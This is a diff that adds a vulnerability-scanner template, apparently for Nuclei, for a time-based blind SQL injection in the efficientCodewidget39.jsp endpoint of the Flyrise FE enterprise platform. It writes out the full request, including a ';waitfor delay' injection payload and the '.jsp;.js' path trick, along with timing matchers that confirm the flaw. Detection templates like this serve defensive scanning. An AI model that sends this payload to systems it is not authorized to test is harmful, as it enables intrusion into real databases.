@@ -1,0 +1,31 @@
+id: flyrise-fe-efficientCodewidget39-sqli
+info:
+  name: 飞企互联-FE 企业运营管理平台 efficientCodewidget39 SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /common/efficientCodewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:{{t1}}%27--+ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "表单控件"
+          - "请输入搜索关键字"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
